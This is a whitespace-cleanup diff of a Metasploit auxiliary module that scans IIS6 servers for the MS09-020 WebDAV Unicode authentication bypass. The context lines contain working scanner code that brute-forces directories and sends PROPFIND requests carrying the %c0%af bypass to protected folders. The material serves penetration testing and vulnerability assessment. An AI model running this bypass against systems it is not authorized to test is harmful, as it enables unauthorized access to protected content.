@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -21,7 +21,7 @@ class Metasploit3 < Msf::Auxiliary
 	include Msf::Auxiliary::Report
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'   		=> 'MS09-020 IIS6 WebDAV Unicode Auth Bypass Directory Scanner',
 			'Description'	=> %q{
 				This module is based on et's HTTP Directory Scanner module,
@@ -41,47 +41,47 @@ class Metasploit3 < Msf::Auxiliary
 					[ 'OSVDB', '54555' ],
 					[ 'BID', '34993' ],
 				],
-			'Version'		=> '$Revision$'))   
-			
+			'Version'		=> '$Revision$'))
+
 		register_options(
 			[
-				OptString.new('PATH', [ true,  "The path  to identify files", '/']),
+				OptString.new('PATH', [ true,  "The path to identify files", '/']),
 				OptInt.new('ERROR_CODE', [ true, "Error code for non existent directory", 404]),
-				OptPath.new('DICTIONARY',   [ false, "Path of word dictionary to use", 
+				OptPath.new('DICTIONARY',   [ false, "Path of word dictionary to use",
 						File.join(Msf::Config.install_root, "data", "wmap", "wmap_dirs.txt")
 					]
 				),
-				OptPath.new('HTTP404S',   [ false, "Path of 404 signatures to use", 
+				OptPath.new('HTTP404S',   [ false, "Path of 404 signatures to use",
 						File.join(Msf::Config.install_root, "data", "wmap", "wmap_404s.txt")
 					]
-				)				
+				)
 			], self.class)
-			
+
 		register_advanced_options(
 			[
 				OptBool.new('NoDetailMessages', [ false, "Do not display detailed test messages", true ])
-			], self.class)			
-						
+			], self.class)
+
 	end
 
 	def run_host(ip)
 		conn = true
 		ecode = nil
 		emesg = nil
-	
-		tpath = datastore['PATH'] 	
+
+		tpath = datastore['PATH']
 		if tpath[-1,1] != '/'
 			tpath += '/'
 		end
- 	
+
 		ecode = datastore['ERROR_CODE'].to_i
 		vhost = datastore['VHOST'] || wmap_target_host
 		prot  = datastore['SSL'] ? 'https' : 'http'
-		
-		 
+
+
 		#
 		# Detect error code
-		# 		
+		#
 		begin
 			randdir = Rex::Text.rand_text_alpha(5).chomp + '/'
 			res = send_request_cgi({
@@ -91,13 +91,13 @@ class Metasploit3 < Msf::Auxiliary
 			}, 20)
 
 			return if not res
-			
-			tcode = res.code.to_i 
 
-	
+			tcode = res.code.to_i
+
+
 			# Look for a string we can signature on as well
 			if(tcode >= 200 and tcode <= 299)
-			
+
 				File.open(datastore['HTTP404S']).each do |str|
 					if(res.body.index(str))
 						emesg = str
@@ -115,11 +115,11 @@ class Metasploit3 < Msf::Auxiliary
 				ecode = tcode
 				print_status("Using code '#{ecode}' as not found.")
 			end
-			
-			
+
+
 		rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-			conn = false		
-		rescue ::Timeout::Error, ::Errno::EPIPE			
+			conn = false
+		rescue ::Timeout::Error, ::Errno::EPIPE
 		end
 
 		return if not conn
@@ -133,13 +133,13 @@ class Metasploit3 < Msf::Auxiliary
 					'uri'  		=>  tpath + testfdir,
 					'method'   	=> 'PROPFIND',
 					'ctype'		=> 'application/xml',
-					'headers' 	=> 
+					'headers' 	=>
 						{
 						},
 					'data'		=> webdav_req + "\r\n\r\n",
 				}, 20)
 
-				
+
 				if(not res or ((res.code.to_i == ecode) or (emesg and res.body.index(emesg))))
 					if !datastore['NoDetailMessages']
 						print_status("NOT Found #{wmap_base_url}#{tpath}#{testfdir} #{res.code} (#{wmap_target_host})")
@@ -147,7 +147,7 @@ class Metasploit3 < Msf::Auxiliary
 				elsif (res.code.to_i == 401)
 					print_status("Found protected folder #{wmap_base_url}#{tpath}#{testfdir} #{res.code} (#{wmap_target_host})")
 					print_status("\tTesting for unicode bypass in IIS6 with WebDAV enabled using PROPFIND request.")
-					
+
 					cset  = %W{ & ^ % $ # @ ! }
 					buff  = ''
 					blen  = rand(16)+1
@@ -160,16 +160,16 @@ class Metasploit3 < Msf::Auxiliary
 						'uri'  		=>  tpath + bogus + testfdir,
 						'method'   	=> 'PROPFIND',
 						'ctype'		=> 'application/xml',
-						'headers' 	=> 
+						'headers' 	=>
 							{
 								#'Translate'	 => 'f', # Not required in PROPFIND, only GET - patrickw 20091518
 							},
 						'data'		=> webdav_req + "\r\n\r\n",
 					}, 20)
-					
+
 					if (res.code.to_i == 207)
 						print_status("\tFound vulnerable WebDAV Unicode bypass target #{wmap_base_url}#{tpath}%c0%af#{testfdir} #{res.code} (#{wmap_target_host})")
-						
+
 						report_note(
 							:host	=> ip,
 							:proto	=> 'HTTP',
@@ -182,9 +182,10 @@ class Metasploit3 < Msf::Auxiliary
 				end
 
 			rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
-			rescue ::Timeout::Error, ::Errno::EPIPE			
+			rescue ::Timeout::Error, ::Errno::EPIPE
 			end
 		end
-	
+
 	end
 end
+
